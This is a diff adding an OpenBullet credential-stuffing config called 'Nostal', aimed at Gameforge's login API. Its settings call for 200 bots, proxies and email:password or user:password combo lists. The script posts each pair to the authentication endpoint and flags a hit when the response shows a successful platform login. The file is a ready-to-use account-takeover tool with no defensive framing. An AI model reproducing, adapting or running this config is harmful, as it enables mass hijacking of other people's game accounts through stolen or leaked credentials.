@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "Nostal",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-22T14:54:30.3970384+02:00",
+  "AdditionalInfo": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.6.2 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://spark.gameforge.com/api/v1/auth/thin/sessions" 
+  CONTENT "{\"identity\":\"<USER>\",\"password\":\"<PASS>\",\"locale\":\"fr_FR\",\"gfLang\":\"fr\",\"platformGameId\":\"dd4e22d6-00d1-44b9-8126-d8b40e0cd7c9\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: spark.gameforge.com" 
+  HEADER "Origin: spark://www.gameforge.com" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":{\"message\":\"Unauthorized\"}}" 
+  KEYCHAIN Success OR 
+    KEY "\",\"isPlatformLogin\":true,\"" 
+
